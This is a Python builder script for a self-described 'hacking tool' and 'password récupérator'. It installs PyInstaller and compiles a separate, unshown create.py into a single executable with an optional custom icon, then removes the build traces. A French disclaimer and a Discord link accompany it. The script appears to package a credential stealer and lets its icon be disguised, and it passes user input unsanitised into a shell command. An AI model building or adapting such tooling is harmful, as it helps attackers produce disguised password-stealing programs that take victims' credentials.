import sys,time,random, os, shutil, ctypes, colorama

def print_slow(str):
    for letter in str:
        sys.stdout.write(letter);sys.stdout.flush();time.sleep(0.05)

os.system('cls')
ctypes.windll.kernel32.SetConsoleTitleW("ETH4N - Password récupérator")
print(colorama.Fore.LIGHTBLUE_EX)
print_slow("********** ETH4N HACKING TOOL **********\n")
print_slow("\nL'utilisation de cet outil sur de vrais personnes non consentantes est illégal.\n Je ne suis non responsable de toute personne utilisant cet outil a une fin non éducative. ")
print(colorama.Fore.MAGENTA)
print_slow("\n\n ********** BY ···· ·− −·−· −·− ツETH4N╥︣۶ʖ͠≖#3253 JOIN DISCORD : https://discord.gg/WMtWzV2hPV **********");input("\n\n\n-Appuyez pour continuer... \n\n")
print(colorama.Fore.YELLOW)
icon = input("Voulez-vous mettre une icone sur le fichier exe ? Si oui ecrivez l'emplacement ici : ")
os.system('pip install pyinstaller')
time.sleep(5)
ed = len(icon)
if ed > 3:
    print('pyinstaller --onefile --icon='+icon+' create.py')
    os.system("pyinstaller --onefile --icon="+icon+" create.py")
    time.sleep(15)
    os.remove('create.spec')
    shutil.rmtree('build')
    shutil.rmtree('__pycache__')
    shutil.move('dist\create.exe', 'create.exe')
    shutil.rmtree('dist')
elif ed < 3:
    os.system('pyinstaller --onefile create.py')
